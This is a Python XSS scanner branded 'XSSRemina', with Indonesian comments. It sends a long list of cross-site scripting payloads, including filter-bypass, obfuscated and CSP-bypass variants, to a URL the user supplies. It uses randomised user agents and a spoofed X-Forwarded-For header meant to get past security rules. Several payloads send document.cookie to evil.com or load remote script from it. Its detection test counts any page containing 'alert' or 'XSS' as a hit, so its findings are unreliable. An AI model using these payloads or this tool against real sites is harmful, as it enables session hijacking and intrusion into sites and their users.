import requests
from fake_useragent import UserAgent
import concurrent.futures

# Warna ANSI untuk teks
RED = "\033[1;31m"  # Merah terang
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Banner XSSRemina dengan font dan warna yang menarik
def print_banner():
    banner = f"""
{RED}
███████╗██╗  ██╗███████╗██████╗ ███████╗███╗   ███╗██╗███╗   ██╗ █████╗
╚════██║██║  ██║██╔════╝██╔══██╗██╔════╝████╗ ████║██║████╗  ██║██╔══██╗
    ██║███████║█████╗  ██████╔╝█████╗  ██╔████╔██║██║██╔██╗ ██║███████║
   ██╔╝██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██║╚██╔╝██║██║██║╚██╗██║██╔══██║
  ██╔╝ ██║  ██║███████╗██║  ██║███████╗██║ ╚═╝ ██║██║██║ ╚████║██║  ██║
  ╚═╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
{CYAN}
---------------------------------------------------------------
 XSSRemina - by Haddad Al Farisi
---------------------------------------------------------------
{RESET}
    """
    print(banner)

# Payload XSS untuk bypass keamanan
xss_payloads = [
    # Basic Payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",

    # Bypass Filters
    r"<script>/*<![CDATA[*/alert('LOSERVISUAL');/*]]>*/</script>",
    r"<script src=data:,alert('HACKEDREMINA')></script>",
    r"<img src='x'onerror='alert(`XSSREMINA`)'>",
    r"<img src='x'onerror='eval(`alert(\"XSS\")`)'>",
    r"<img src='x'onerror='new Function`alert\\`XSS\\``'>",
    r"<img src='x'onerror='import(`data:text/javascript,alert\\`XSS\\``)'>",
    r"<img src='x'onerror='setTimeout`alert\\`XSS\\``'>",
    r"<img src='x'onerror='setInterval`alert\\`XSS\\``'>",
    r"<img src='x'onerror='Function`alert\\`XSS\\``'>",
    r"<img src='x'onerror='window.location=\"javascript:alert(\'XSS\')\"'>",

    # Advanced Bypass Payloads
    r"<svg/onload=alert('XSS')>",
    r"<svg><script>alert('PriaJomblo')</script></svg>",
    r"<svg><a xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='javascript:alert(\"XSS\")'>Click</a></svg>",
    r"<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
    r"<svg><animateTransform onbegin=alert('XSS') attributeName=transform type=rotate>",
    r"<svg><set attributeName=x to=1 onbegin=alert('XSS')>",
    r"<svg><animate attributeName=x values='1;2' onend=alert('XSS')>",

    # Professional Bypass Payloads
    r"<img src='x'onerror='eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'>",
    r"<img src='x'onerror='eval(unescape(\"alert%28%27XSS%27%29\"))'>",
    r"<img src='x'onerror='eval(atob(\"ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhhbXBsZS5jb20n\"))'>",
    r"<img src='x'onerror='fetch(\"https://evil.com/steal?cookie=\" + document.cookie)'>",
    r"<img src='x'onerror='new Image().src=\"https://evil.com/steal?cookie=\" + document.cookie'>",
    r"<img src='x'onerror='document.write(\"<script src='https://evil.com/steal?cookie=\" + document.cookie + \"'></script>\")'>",
    r"<img src='x'onerror='window.location=\"https://evil.com/steal?cookie=\" + document.cookie'>",

    # Obfuscated Payloads
    r"<img src='x'onerror='eval(\"al\"+\"ert(\'XS\'+\'S\')\")'>",
    r"<img src='x'onerror='eval(\"a\"+\"l\"+\"e\"+\"r\"+\"t\"+\"(\"+\"'\"+\"X\"+\"S\"+\"S\"+\"'\"+\")\")'>",
    r"<img src='x'onerror='eval(\"\\x61\\x6C\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29\")'>",
    r"<img src='x'onerror='eval(\"\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0058\\u0053\\u0053\\u0027\\u0029\")'>",

    # DOM-based XSS Payloads
    r"#<script>alert('XSS')</script>",
    r"#javascript:alert('XSS')",
    r"#<img src=x onerror=alert('XSS')>",
    r"#<svg/onload=alert('XSS')>",
    r"#<body onload=alert('XSS')>",

    # WebAssembly Payloads
    r"<script>WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0]))</script>",
    r"<img src='x'onerror='WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0]))'>",

    # Service Worker Payloads
    r"<script>navigator.serviceWorker.register('data:text/javascript,alert(\"HACKEDINDO\")')</script>",
    r"<img src='x'onerror='navigator.serviceWorker.register(\"data:text/javascript,alert(\\\"XSS\\\")\")'>",

    # CSP Bypass Payloads
    r"<script nonce='123'>alert('XSS')</script>",
    r"<img src='x'onerror='eval(\"alert(\'XSS\')\")' nonce='123'>",
    r"<script src='https://evil.com/xss.js'></script>",
    r"<img src='x'onerror='import(\"https://evil.com/xss.js\")'>",

    # Polyglot Payloads
    r"javascript:/--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[/[]/+alert(1)//'>",
    r"<img src='x'onerror='fetch(\"https://evil.com/steal?cookie=\" + document.cookie, { headers: { 'X-Forwarded-For': '127.0.0.1' } })'>",

    # Additional Payloads
    r"<img src='x'onerror='location.href=\"javascript:alert(\'XSS\')\"'>",
    r"<img src='x'onerror='document.cookie=\"test=1; path=/\"'>",
    r"<img src='x'onerror='document.domain=\"evil.com\"'>",
    r"<img src='x'onerror='document.write(\"<iframe src='https://evil.com'></iframe>\")'>",
    r"<img src='x'onerror='document.body.innerHTML=\"<h1>Hacked</h1>\"'>",
    
]

# Fungsi untuk memeriksa XSS
def check_xss(url, payload):
    ua = UserAgent()
    headers = {
        'User-Agent': ua.random,
        'Referer': url,  # Menambahkan referer untuk mem-bypass beberapa aturan keamanan
        'X-Forwarded-For': '127.0.0.1'  # Menambahkan header khusus
    }
    test_url = url + payload
    try:
        response = requests.get(test_url, headers=headers, timeout=10)
        if payload in response.text or "alert" in response.text or "XSS" in response.text:
            print(f"{RED}[!] XSS Vulnerability Found: {test_url}{RESET}")
            return True
    except Exception as e:
        print(f"{BLUE}[!] Error: {e}{RESET}")
    return False

# Fungsi utama
def main():
    print_banner()
    url = input(f"{BLUE}[*] Paste URL yang mau di-scan (https://example.com/page?param=): {RESET}")
    vulnerable = False
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_xss, url, payload): payload for payload in xss_payloads}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                vulnerable = True
    if not vulnerable:
        print(f"{GREEN}[+] No XSS Vulnerability Found{RESET}")

if __name__ == "__main__":
    main()
                  